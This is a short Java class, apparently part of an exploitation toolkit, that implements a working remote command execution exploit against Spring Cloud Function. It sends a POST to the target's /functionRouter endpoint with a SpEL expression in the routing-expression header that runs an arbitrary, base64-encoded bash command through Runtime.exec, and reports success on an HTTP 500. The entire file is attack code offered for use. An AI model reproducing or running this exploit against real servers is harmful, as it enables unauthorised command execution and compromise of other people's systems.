package com.exploit;

import com.entity.VulResult;
import com.github.kevinsawicki.http.HttpRequest;
import com.util.Tools;

/**
 * Author 莲花
 */

public class SpringCloudFunction {
    public VulResult execVUL(String url, String cmd) throws Exception {
        String payload_url = url + "/functionRouter";
        String base_cmd = "bash -c {echo," + Tools.encode(cmd) + "}|{base64,-d}|{bash,-i}";
        String cmd_payload = "T(java.lang.Runtime).getRuntime().exec(\"" + base_cmd + "\")";
        int code = HttpRequest.post(payload_url).header("spring.cloud.function.routing-expression", cmd_payload).send("xxx").code();
        if (code == 500) {
            return new VulResult(true, "");
        }
        return new VulResult(false, "");
    }
}
